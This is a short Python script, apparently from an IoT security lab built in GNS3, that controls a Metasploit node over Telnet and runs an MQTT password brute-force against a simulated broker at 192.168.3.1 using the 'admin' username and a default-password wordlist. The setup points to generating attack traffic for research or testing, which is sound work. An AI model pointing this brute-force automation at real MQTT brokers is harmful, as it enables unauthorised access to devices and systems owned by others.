import re
import time
from telnetlib import Telnet
from gns3utils import *


def mqtt_bruteforce(hostname: str, telnet_port: int, rhost: str, rport: str, username: str, sleep_time: float = 2) -> None:
    """ Metasploit.
    """

    with Telnet(hostname, telnet_port) as tn:
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"use auxiliary/scanner/mqtt/connect\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(f"set rhosts {rhost}\n".encode("utf-8"))
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(f"set rport {rport}\n".encode("utf-8"))
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(f"set username {username}\n".encode("utf-8"))
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"set PASS_FILE data/wordlists/default_pass_for_services_unhash.txt\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b'set USER_FILE ""\n')
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"exploit\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))


PROJECT_NAME = "iot_sim"
check_local_gns3_config()
server = Server(*read_local_gns3_config())
project = get_project_by_name(server, PROJECT_NAME)

all_iot = get_nodes_id_by_name_regexp(server, project, re.compile("iotsim-.*", re.IGNORECASE))
msf = next(filter(lambda i: i.name == "iotsim-metasploit-1", all_iot))
msf_h, msf_p = get_node_telnet_host_port(server, project, msf.id)

mqtt_bruteforce(msf_h, msf_p, "192.168.3.1", 1883, "admin")
